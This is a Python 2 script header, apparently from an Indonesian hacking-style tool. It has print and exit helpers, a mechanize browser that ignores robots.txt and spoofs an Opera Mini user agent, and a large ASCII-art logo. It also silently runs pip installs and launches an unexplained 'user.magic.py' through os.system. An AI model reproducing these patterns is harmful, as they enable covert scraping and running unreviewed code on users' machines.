#!/usr/bin/python2
# coding=utf-8

#Import module
import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool
try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 user.magic.py")
from requests.exceptions import ConnectionError
from mechanize import Browser 

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "[!] Exit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
#########LOGO#########
logo = """
\033[1;34mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMNNMNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMNNNMNNMMNNNNMMMMNNMMMMMMMMMMMMMMMNNNNMMNNNMNMMNNmmyssyyhhdmmNNNNNNNMMNNNMMMNNNNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNMMMMMMMMMMMMMMNNNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMNNNNMNNNNMMMNNMMMMMMMMMMMMMMMNNNMNNMMMMMMMNNmmmNNNNNNmmmmmmNNNNNNNNMMMNNmmmmmNMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMMMMMMMMMMMMNNNdysshmMMMMMMMNmmmNNMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmyo/+ydNMMMMMMMMMMMMMNmdhdmNMMMMMMMMMMMMMMMMNdy+/+oydNNMMMMMMMMNNdy++sdNNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNMMNNMMMMMMMMMMMMMMMMMMNMMMNNNmdhddmNNNNNNNNMNNNNNNNNNNNmdddmNNNNNNNNNNNNNNNNNNhs++oydmNNNNNNNNNNNNNdyo+oymNNNNNNNNNNNNNNMNNNNNmhsoshmNNNMMMMMMMMMMNNMNNNNNNNNNNmNNNNNNNNNNNNNmmmmmmmmmhs+oymNNNNNmmddmmNNMMMMMMMMMMMMMMMNNdyooydNMMMMMMMMMMMMMMMMMMMMMMMMMNmho+ohmNNNNNMMMNmdyo+::/ohNMMMMMNmy+:/sdNNMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMNMMMNdyo+oymMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNds+:://+ohmNMMMMMMMMMMmho::/odNNMMMMMMMMMMMMMmyo//////+oydNMMMMMNds+/::/+ydNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmhyo+++oshmNNNMMMMMMMMMMMMMMMMMMMMMMMMNh+::/+oydmNNNNMNNNMMMNNNmy+::+ydNNNNNNNNNNNNNNNmy/:::/:/oyhmNNNNNNNmhs+/+ydmNNNNNNNNNNNNNNNNNNNmho/:::/shmNMMNNNNNNNdyssyhdmmmds+///++shmNNNNNmmmNNNNNmyo/:-:/symNNmmddmmNNNMMMMMMMMMMMMMNNds+:--/ohmNMMMMMMMMMMMMMMMMMMMMMNNho/:-:+ymNNNNmdyo/:-::+shdNNMMMNmh+::::/ohmMMNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMNNds+/+ymNNMMMMMMMMMMMMMMMMMMMMMMMMMMNNMNmy+///+++//+ydNMMMMMMMMNy+:////+ymNMNNMMNNNNNNNho///+////:/+sdNMNmy+:///////ohNMMMMNdssydmNNNMMMMMMMMMMMMMMMNmho/:::::/ohNNNNMMMMMMMMMMMMMNNNMNNMMMNNmddhso+/+ohmNNMMMMNNNMNds/:::/+ohmNNNNMMNNNNMMNho:://///::+shmNNNNds/:/ydNNNNNNNNNNNNNNNNNNNNNho/:::::::+ymNMNNNNNNmhs+/::/+oo///oyyyyhdmNNmmmmNNNNNmh+/:::::::/shmmdddmNNNNNNMMMMMMMMMMNms+:::::-:/ohNNMMMMMMMMMMMMMMMMMNmho/:-::::/osyyo/:--::/oydmNMMMMMNds/--::--:oymNMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNmds+/+sdNNNNNNMMMMMMMMMMMMMMMMMMNNNNmdhyyhdy+//+//////+sdNMMMMMMNmyo///////sdmdhhhyooooooo///////+///++shNNmy+//////////ydNNNmy+////oshmNMMMMMMMMMMMMMMNNmdhyo/://+yhmNMMMMMMMMMMMMMNNNNNNmdhdNNNNNNmdy+:/ymNMMMMMNNNNho//://:/ohmNNNNNNNNNMNNNds+/////////+shNmh+:::/shdhsooydNNNNNNNNNNNNNNy+:::/:::::+sdNNNNMNNNNmmmdhs+::/oymNNNNNNNNNmmmmmmNNmmy+::--:::::/ohmdsosydmNNNNMMMMMMMMMNms/::::::--:ohmMMMMMMMMMMMMMMMMMMmy+:::::---------:/oshmmNNNMMMMMMMmho/::----:/sdNMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNmho/:/+sdddyooymNMMMMMMMMMMMMMMMMNmho+//::ohho///////////sdNMMMMMMNNdyo+/////oo/:/+/:::::::/ooo///////sydmNMNmy+////////:/sdmNNNmmdhs///ohmMMMMMMMNMMMMNNNmdys+/++///+hmMMMMMMMMMMMMMMNmds+///+hmNMMNNNds//sdNNMMNNNNNNNdyo/:::/+sdNNNNNNMNNNMMNNdyo/::::/+sydmNds+/:::://:/+ydNNNNNNNNNNNNNNNds/:::::::::/sdmNNNNNNNNNNNmdyo/+sdNNNmmddhysooo+oshdmNds/:-------:/ohh+:-::/+shmmNNNNNNMMMNho/::-::---:+ymNMMMMMMMMMMMMMMMMNho:----------/oyhdmNNMMMMMMMMMMMMNNh+:-------/sdNNMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNho//////+/+oydNNMMMMMMMMMMMMNNmho+/////+ohmmy/:////////:+ymNMMMMMMMNmy+/////oo+++++++oooooydmmyo////:/+ymNMMNh+/////////:/ohmNMMMMNNdy+/+ymMMMMMMMMMNNmhy+//+shdyo//ohNMMMMMMMMMMMNmds+::::/+sdNNNNNMNho::odmmdmmNNNNNNNmho/::::+ymmNmmNMMMMMMMNNmhs/:::::/shmNNmdysooosyydmNNNNNNNNNNNNNNNNNmh+::::::::::/sdNNNNNNNNNmddhyo///+oo+//++oossyyyhdmNNNmy/:-------::/oyo:------:/+osydmNNMNNdo:::-----:-:+ymNMMMMMMMMMMMMNNmds/-----------/hmNNNMMMMMMMMMMMMMMMNdo:------.-:sdNMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNNmhyyyssyhdmNNNMMNMMMMMMNMNNdy+:://///+sdmNNho///////+syhdNMMMMMMMMMmh+/////ohdmdddddmmmmNNNNNmhs+//:::/ohNNNdo/:///://+sshdNMMMMMNNNds++ymMMMMMNNdhso///oyhmmdy+/+sdNNMMMMMMMMNNmyo:::::::/shdhysydmds/--/so/:/+sdmmNNNNds/::::/ohmmNNNMMMMMMNMMNNmy+/:::::+ymNmho//osydmmNNNNNNNNNNNNNNNNNNNho::::--:/+osymNNNmmdhyso////++oosyyhhhdddddhyssydmmmmdy/::-----:+ooyhhs+/----------:+osydmds/:-----:/+oshmNMMMMMMMNNmdhs+/:---------:/+osdNMMMMMMMMMMMMMMMMMMNms:---------/smNMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNNNNNMMMNdhydmNNMNMMNNMMNNNMNNNNNdy/::/ooo+//sdNNNNms/://///+ydNNMMMMMMMMMMNh+::////sdNNds++oydmNNMMMMNdy+/::/::+ydNms+::/:::/+hmNNNMMMMMMMNmdhhmNNmdhysoo+oosyyhdNmy/:/+syhmNMMMMMMMNds/:-:+++/:/ohho::/sddy/---://:---:/ohmmmmds/:--::+ymNNMMMMMMMMMMMNNNmho:-::-::ohhs:----::/+syhdmNNNNNNNNNMMMNNds/-----:/sdmNNNmy+/::///+shddmmmmmddhhhhdhhysyyhhyyyhhy+:------:ohmNNNmdhso/------------:://:-------/sdmNNNNNNNNmdyo/:----:+o+:---.-:+ydNNMMMMMMMMMMMMMMMMMMMMmy/--..--:+shdNMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNNNNNNMmh+:/ymNNNNNNNNNNNNNNNNNmyo::/shdhs//ohNMMMNmy+:///::/ohNMMMMMMMMMMMNho/::::/+hNNdyo////+shmNMMMNmho+:::::+smmho/::::::/sdNMNMMMMMMMMMMMMNNdhyyyhdmmNmho/ohmdo::////ohNMMMMMNmy+::/shhyo:/shdy/--:+ss+::--:://:---:+ydddmds/:---::ohNMMMMMMMMMMMNNNNmmho/:----:/++:----------:/+oshdmNNNMMNNMNms/------:odNMMNmho++++++oydmmmmdhyssoshddddddmmddhyyhdho/-------+ymNNNNNNNmhs+:----.----:::::-------:+hmNNNmdhs+/:---:+oyhdmmy/--..--/sdNMMMMMMMMMMMMMMMMMMMMMNy+:-..--:ohNNMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNNNNNNNho::sdNNNNNMMNNNNNNNMNNds/:/sdmmho/:+hmNNMMMNh+:::/:::+ymMMMMMMMMMMMNh+::::::/ohNNNNNmhs+//ohmNMMMNdy+/::::/ymms/:::::::+hNNNMMMMMMMMMMMMMMMNNMMMMMNmy+:+hNNNmdyyyhdmNNMMMMNds:-/sdmmy+::odmNmhs+/////+osso++//://oshdmmmds/:----:+ymNMMNMMMNNNmmmdhyyhhy+:----:+so+/:-------------/+shmNNNNMNNy+-------+hNMNNNNNmmdhs+++osssoo+//+shdmmddmmNNNmmmmmmdyo:------/odNMNNNNNNNNmhs/:--..---:/+/:-------/shdhs+:-.--:+oydmNNNNNNy/-....-:+hNMMNMMNMMMMMMMMMMMMMMMNh+:-...--/yNMMMNMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNNNNNms/:/ymNNNNNNNNNNMNNNNNho:-:odNmy+::+smNNNMMMNdo/::::::/smMMMMMMMMMMNdo::::::::/ohmNMMNNmds//sdNMMMMNmyo/::::odmh+::::--:/sdNMMMMMMMMMMMMMMMMMMMMMMMNms::+dNMMMMNNNNMMMMMMNNh+:-:sdNms/:-+ymNNMNNNmmmmmmNNNNNmmmdddddmmNNNdo:-------/sdNNNNNmhyssooossyyhdho/---:/sdmdhs+:------------::/sdNNMMNh+:------/smNNNMMNNNNmhysssssso++osyhdmmdddmNNNNNNNmmmmdh+:-----:+dNNNNNNNNNNNNmdhs+:---.----:-------://:---::+oyhdmNNNNNNNNNy/-...---/ymNNmmmNNNNMMMMMMMMNMMMNds/-....-/smMMMNNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNNNNNdo::/ymNNNNNNNNNNNNNNNdo:-/ohmNdo:::+sdNMNNNMNds/::::::/odNMMMMMMMNmdo::/+o+:::-:/oydmNNNNho+sdNMMNNMNmho/:::ohNds/::---::+ymMMMMMMMMMMMMMMMMMMMMNNNmh+::omMMMMMMMMMMMMMMMNh+:-:odNNh+---+yNNMMMMMMMMMMMMMMMMMMMMMNNNNNNmho:-://-....:+shhhyso+++osyddmdhhdhs/:--:smNNNNmhy+:-------::+oshmNNMMMdo:--...-:odNMMMNNNNNmdddhysoosyyo+::+os+//oymNNmmmmmmNNms:----.-/ymNMNNNNNNNNNNNNNmhs/:-...---.....----:/+syssssyhddddmNNNNNh+:-..---:sdmho//oshdNNNMMNNMMNMMNmy+-....-:omNMMNNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMNNNd+::/ymNNNNNNNNNNNNNNdo:::odNNNdo/:-:/sdNNNNMNmy/:::::::+hNMMNNNNmho/-:+ydmds+:----:/+oyhdhhhdmmNNmmmdys+:-:+ymNNdo:------:sdNMMMMMMMMMMMMMMNNmdhyssss/-:odMMMMMMMMMMMMMNNho:-:sdNMNh+---:ohmNMMMMMMMMMMMMMMMMMMMMMNNNmhs/--/sys+-.....---:/osyhhhddmmmmdhyso/:-:odNMMMMMNNmds+:-------:+shmNNNNds:-.....-+hNNMMNNNNNmmds+:-:oyhs/:--:///:--/shmmmmmNNNNmy+------:sdNMNNNNNNNNNNNNNNNNmho+:--...--...-:oyddhs+/+oshdhhydNNNNNdo:-....-:ohmho/:---:+shmmNNNMMMMMNdo:-.-.--+dNMMNNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMNNNNdo:::ohNNNNNNNNNNNNNdo:-:+hmNNNmy+/:--:/oyhdmmdy+:-----:/ydmmdhyo/:--/sdmNNNmhs+:-------::://+++++//::---:+shmNMMms/-------ohNMMMMMMMNNmdhyso+///+osyy+--/ymNMMMMMMMMMMNmho:-:odNMMMms/:---/oyhmmNNNNNNNNNNNNNNNNNmdho+:---:+ssooo+/:-.....--:://++oo+++/::----/sdNMMMMMMMMNNNmho/:---.---:+yhdmms/-..--.-+ymMMMMMMNNNmdo/--:+ss+:--.-:++/:-:+sdmmNNNNMMNdo:-.---:+hNMMNNNNNNMMNNNNNNNmdyo:-....---...-/syys+//oyhdmmddmmmmmmdo/-...--:+hNNmddhs+/:-:+ymNMMNNNMNms:-...--/hNMMNNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMNNNNmyo/::+shmmmNNNNNmdy+:-:ohmNNNNNmdy+::-----:////:-------:////:---::+sdmNNNNNNNNmhso/::----------------:/oydmNMMMMNh+:------/sdNNmddyso+///++syhdmNNNNmy/--/shmNNMMMMNNmhs+:-:ohNNMMMNmyo/--.--:://+oosssssooooo++//:---:+ssyyyyhhdmdyo/--..................-:/shmNMMNMMMNNNmmNNNmhyo/:-...---:/oso:-------/smNMMMMMMNNmmhy+/:::::/++o+//://+oyhddNNNNMNMNms:-..---/ymNMMNNMMMNNNNmmhyo/:----://:-.......-----/oyhdmmNNNmmmmNNmy/-.-----/yNNNNNNNmdyo:-:sdNMMNNNNmy/-...--:ymNMNNNMNMMMNMMMMMM
MMMMMMMMMMMMMMMMMMMMNNNNNdy+:--:/+ossssso/--:+sdmNNNNNNNNmds+/-------------------..--:/oyhmNNNNNNNNNNNNNNmmdhyso+++///+/++osydmmNNNNMMMMMds:---..--/oso+//++oyhdmmNNMMMMMMMMNmyo/--:/+syhhhhs+/:::/oydmNNNNNNNmy+:---.....................-:+oydmNNNNNmmNNmmdho:--://:::::::://++oyhdmNMMMNNmhyo////+sdNMNmdyo:--.....--:----...-:odNMMMMMMMNNmmmmmdhyyhmmNNNmdhhyhdmhshNNNNNNNNds/--..--:odNNMMNMMNNmdyo/:-..-:/osyhho:............-:+oyhmmmmmmmmNNmho-..----/smMMNNMMNNNds:-/ymMNNNNNNh+------:odNNNNNNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMMMNNNmhso//::::::://+shmmNNNNNNNNNNNNNmdhso+//::----------:/+sydmNNNNNNNNNNNMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMMMMMmh/---..-:/oyhhdmNNNNMMMMMMMMMMMMMNMNNdyo/:::-------::+osyyyhddmNNNNNNmdhys++/:--------.-...-:/oshdmmNNNMMMMNNNNmmhyo++shmmmmmmmmmmmmNNNMMMMMMMMNds++++/:--/odNMMMMNNdhs+:--...----...--:ohNMMMMMMMMNNNNNMMmhydNNNMMNNmdyssysoydmddhs+++/:---.---+hNNNNNmdyo/-...-:+oosssssso/-.``.............-/+ssyhdddmNNdo:------:omNMNNMMNNNmy/:+hmNNNNNNNdo:-:::::+hNNNNNNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNmmdddhhhdddyssssyhdmNNNNNNNNNNNNNNNmmddhys/:---.-/sdNNNMMNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNMNNNNNNNNNNNNMMMMNmo:--..--/smNNNMNMMMMNMMMMMMMMMMNMNds+/+shdhhhhyyyhhhhhyssssyhdmmNmyo+/oydmmmdhhhyyyyssss++shdmNNNNNNNNMNNNNNNmhsoohmmNNMMMMMMMMMMMMMMMMMMMMMMNNmdddys+/+sdmNMMMMMMMMNNmhso:--..--....--/ymNMMNMMMMMMNmNNNmyshNNNMNNNNmdy+//:::::://+shhy+:--..-/sdddy+/:-..-:/oyhmmdhyyyhhhs/-...---:////:---------:/oydmNms/:::::-:odNNNNMMNNNmhsyhmNMNNNMMNms/::/:::+ymNNNMNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNds/------:/oyhmNNNNNNNNNNNNNNNNNh+--...-/sdNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmy/--...--+hNMMMNNmdhhhdNMMMMMMMNmho-..-+hmNNmdhhdmmmdhyooooosyhddy/-..-:/shmNNmNNNNNmmmdyosssydmmho++oyyooosso++sdNNNMMMMMMMMMMMMMMNNmmNNNNmdhysoo+oshdNNMMMMMMMMMMMMMMMNNdhy+::-....---/oydmNNMMMMMNNmdddhhdmmmddhso++/:--://:/ydmNNNNds:------://::--:/+oydmmNmmdhhhdmmmNds/:::::/+oyhhso++////:----:+oyhs/:////:/+hmNNNMMNNMNNNNNNNNNNNMNNmy+://////sdNNNMNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMMMMMNNNMMNNNNNNNNNds/--:-::::--:oydmNNNNNNNNNNNNNNh+--....:+hmNNNNNNNNmmdhyysssssyhhdmNNNNNNNNNNNNNNNNNNNNNmdhhhdmNNNh+:--..--/ymNNmds/:--:ohNNNNMNNds/-..--/ymNds/--:+shhhyo++++osyyo/:--...-:/oyhdmmNNNNmmdo:---/hdy/-..-:/:-...-/ydNMMMMMMMMMMMNNmhyso////oo+/++oyhmmNNMMMMMMMMMMMMMMMMMMMMMMNNmdy/----------:+symNNMMNNdyyyyyso+/:///+oosssyhdhs+/oydNNNms/::::::::://oshmNNMMNNmdhyyyhddmmmdy+////////oyhhyyhhyso+//////:///////////+ymNNNMNNNNNNNNNNNNNNNNMMNho//+++//ohmNMMNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNNdy+/:::::///:-:+hmNNNNNNNNNNNNNNdo:-...--/ymNNNNmdyo/:--.......---::/oydmNNNNNNNNNNmmhs+/:---/odNNNdo:--..--:ohmho/-..-:+sdmmmmNNmdho/---:+ymdo:---.--:/oo++///+oooo+//:--...--:/oyhdmNNNmy/...-+yho:-...:/+:...:smNNMMMMMMMMMNNho/:-.......---:://osyhdNNMMMMMMMMMMMMMMMMMMMMMNNNdo::::::::::::::/+shdmmy+::::/ooshddmmmdhdmmmmmmhs++shmdy+////////oshdmNMMMMMMNNmhhyysyhhhhdhs+////////+shdddddmmmdhhys+++++++/+++++/+ymNNNMMMMMMMMMMMMMMMMMMMNdo/+ooo+/oymNMNNNNNNNNNNNNN
MMMMMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNNNmmdhyo/::+shdhyyyhdmNNmmmmNNNNNNNNNms/------/sdNNmy+:--..-......-..-.....-:+ydNNNNmdys+:--....-:+ymNNNmy:--..---://:--..-----::::::::::-----/sddy/----------::::::://++++++/:--.....:+ydmmmmmho:----::--:::------:+ymMMNMMMMMMMMNds:--:/++ooo+++/::::::::::/oyhdmNMMMMMMMMMMMMMMMMMMNdo///////////////////++++osyhdmmmmmddddhdmNNNmmmmmdhs+/:::///++//+sdNNNMMMMMMMNmdysyyssyhyyhhso+/+++///+sdmddddddmmNNNmdhysoooooooo+++ohmNNNNMMMMMMMMMMMMMMMMMMms++osso+osdNMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMNNNNNNNNNNNNNmddys+/:-:/oymmNNmmmmmdhys+//+sdNNNNNNNNmy+:--..-:ohdy+:-.----:/++//:----........-:+++//-...........-:/+osyyo:--..-----..------..............--:+hmNNmyo:------........--:/+//+ooo/:---...-:+shdddhyyyso+oyhddmdhsooshdmNMMMMMMMMMMMNmy/:://+sydmmmmdhs+/:://////:::/sdNMMMMMMMNNNmmmNNMMNdo://////+syyso+++///////+sydmmmdysssydmNNNNNmdys++/:////++++++++/ohNMMMMMMMNNmhs+oydhhddhyyyso+/+++++//shdddhyyydmNNMNNNNmmdhysoossso+++shmNNMMNNNMMMMMMMMMMMMNho+osysooohNMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNNNNNNNNmddyso//://++syhmmNmmmdhyo+/:::/+oshdmNNNmNNNNNNho:--..-:+ss+:-----/+syyyyyso/:--.------...........-:/++/--------------...-----/oyhhso/:----------:/oshmNNNNNNmy+:--::::---.....-/+++//+oso/:-.....-:+yhhhyhddhyhdmmmmmdhyyhmNMMMMMMMMMMMMNNNmho/////:///////////////++//+oydNMMMMMMNhso////+ymNNms//+++//+ymNNmdhysoo+++++///+osyhhhddmmmmmhyo+/::/+oosyhddysoooo+oymNMMMMNmdyooooosyhddhysooo+//++oo++/oydhhyyyhdmNNMMMMMMNNmhssssssyyso+++oshdNNMMMMMMMMMMMMMNdo+oyyysooymMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMNNNNmdyso+++osyhdmmNmmddhso+/::::/+sydmmNNdhsshmNNNNmNNNds/-..---/ss/---------..-----------------------:/+sydmmmho/:--------:::--::::/sdmNNNNNmmddhhhhhhhddmmmNNNNNNNNNmhs+/////:::-...--+sssoo++o+/:---:::::/osyyyhddhyyyhdddddhhhhmNNMMMMMNNNmmdysoo+////+++++++++++++ooooooosshdNNMMMMMMMNhs+/////ohNNmy//+oo+++sdNMMMMNNmdyo+oooooo++/+osyddhso////+++oosyhmmmmmyooosso+sdNMMMNmyo++///::::/++oooss+//+oooo+++syhhdmmmNNNNMMMMMMMNmhooyyyyyssyyysso++oydmNNMMMMMMMMMMms+oyhyysoydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMNNNNNNmmmmmmmddhhso+/:::/+osyhdmmmmmmNmdyo+oydNNNmNNNNNmy+------/shyo/:---------------::::::::::::::/shdmNNNNNNNmdhysoo++++++///////+ydNNNNmdddmmmNNNmhyooooyhdmNNNNNNNmmhyo//////-..-:+shhhyyso++//+++++/////+oshdddhysssyhdddddmmmmmmdhysoo+////+/++++oooooooo++oshhdddmmmmmNNNMMMMMMMMNNmhysossssydNNNh++oosoo+sdNMMMMMMMNmddhhyyyssso+//////++oosssyhdmmmmmdyso//osssooshmNNNmy+/+o+//////++/://oss+:://++///+oydNNNNNNNMMMMMMMMMmhooyhhyysssyyyyhhyso++shdNNNMMMMMMNhooyhhhysydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMNNNNNNmmmy+:::/+osyhdmmmNNmmNNNNNmdyooshmNNNmNNNNmNNmho::::::/sdmmdhhyso++++++++++oossyyyyso/////+ymmNNNNNNNNNNNNNNNmmmmmdy+//////ohNNNmyo////oshyo//+ooo+oydmNNNNNNNNNmhs+++++:--:/syhdhyyssso+osso++/////:/oydddysoo+oyhdhhhysoo+///++++oooosssyyhhhdddmddysosymNNMMMMMMMNNNNNNNNmdyso+osydmNNNNNMMNmo+ossso+ohNNNMMMMMMNNNNNNmdhyssssoo+ooooooyhmmNNNMMMNNdy/--/osysosdmdysoo+osso+////++/::://+so/:-::::::/shmNNMNMMMMMMMMMMMMNhooyhhhysshmmddddhhhhyo++symNMMMMMNdsoydddysydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMNNNNNNNmdhyhhmmmmmNNNNNNmmmNmmmNmy+/ohmNNNNNNNNNNNmNmds/://///sdNNNNmmmmmmmmmmmmmmmmmmmNmmdyo///+shmNNNNNNNNNNNNNNNNNNNNNmho//+//+sdNNNNmmddhyo++/+oydmdhhddddmNNNNNNNNNmhso+++/:-:+osyyssoossssyhhs++//++/:/+shhysooo+/+++///+++oossssyyyhhddmmmNNNNNNNNMNNNddddNMMMMMMMMNmdyyssoossyyhmNNNMMMNNMMMMMms+osyysoohmNMMMMMMMMMMMMNmhs++osyysssssso++oshmNNNMMMNNmy/::+sysshmdsosssyhhys+++oooo+//+syyhho:-:///::+ymNMMMMMMMMMMMMMMMMNdooydddhsshmNNNNmdddddhhysoosdNNMMNmsosdddhyydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNNNNNmmNmmdhhdmmmmmmNNNmmmNmmds//sdmmNNNNNNNmNNmmNmmy+/////+sdmNNNNNNmmmNmNNNNNNNNNNmdhs+////+ohmmNmNNNNNNNNNmmmNNNNNNNmho/+++++ydNNNNNNNNNNmhs+oydmdyshhhhdmNNNNNNNNNmmyo//+/-::/+ooo+++osysyhddhs+/+/////+osso//:::-::++++oossyyhdmmmmNNNNNNNNNNMNNNNMNNNNNNNNNNNNNNNNNmdddddmmNNNNNNNNNNNNNNNNNNNms+oyyhysoydNMMMMMMMMMNmhs+/+syyhhhhhhhyyssso++shdmNNNNNmdo/+syyyhmdyyhhhyso++++oyhyosyyyhddhhhy+/ossso+ohmNMMMMMMMMMMMMMMMMNmsosdddhyshmMMMMMNNmmmdddddyooshNNNms+shddhyydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNNNNNNmho//oydmNmmmNmmNmmNNdy+:/sdmNNNNNNNNNNNNNmmNmhs+++++oydmNNNNNNNNNNNNNNNmmmhys+///++oosyhmmNNNNNNNNNNNNNNNNmNNNNmdy//+oooydmNNNNNNNNNNmmdhhdmdyssyyyyydmNNNNNNNmhs+/::::--://+++//+oyhdddmddhs+////+++++/:------:+oo++ooosssssooooooooooooooosssssssoooooooooooosoossssooooooooooooooooossoooss+:+syhhyosdNMMMMNMNmhs++osyhhddmNNNNmmhyyysss++oshdmmmmmy/:+syyhddhso++++osshhddddyssyyhdhyshdhsoyhhhysshmMMMMMMMMMMMMMMMMMMNyosddddyshmMMMMMMMMMNmmddddhyooydNmy++yhhysydNMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNNNNNmho//ohdmNNmmNNNmNNNNNds/:/sdmmNNNmNNNNNNNNNNmNmdyooo++shmNNNNNNNmNNNNmdhyso+//+ooossyyhdmmNNNNNNNNNNNNNNNNNmNNmdys+/++ssyhdmNNNNNNNNNNNNNNNmhs+//osyyssydmNmmhys++/++//:---:////://+shdmmmmdhys////+ss+/::--:::--:/oooossysssssssssssssssssysssssssssssssssssssssyyyyyyyyssyyyyyyyyyyyyyyyyyyyyysooyhddyssdNMMMMNmho++shhhddmNNMMMMMMNmdhyosso+++oydddmmh+:/oooooooosyhhddmmmmmmmhyyssyyyoshddho+shddhsshmMMMMMMMMMMMMMMMMMMNdsoyhhysoymMMMMMMMMMMMNNmdhyso+++sdh//+oo+oymMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMNNmdy+:/shmmmdddmNNNmNNNmds//+oydmmmNNNmNNNNNNNNmmNmdhsoosyhdmNNmmNNmdhysoo+++ooosssyyyhdmmmmNNNNNNNNNNNNNNNNNNmmhso+++oosyyhdmNNNNNNNNNNNNNNmdyo//osyhyssoosyyso+++osssoo++/:::/:/:::/oyhdmmdhyo+++/::/osso/::::::::::/+oosyyhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhddddhhyyyssyyyhhdddhddddddddddddddmmNmdhhdddyssdNMMMNds+/shhddmNNMMMMMMMNmdhyo++oso+++oyhhhddds++++++oshdmmNmNNNNNNNmdhhhyssoo+shdysooosyyso+ymNMMMMMMMMMMMMMMMMMNds++oo+++ymNMMMMMMMMMMMMMNmhyo+/:/oo///+/+sdNMMMMMMMMMMMMMM
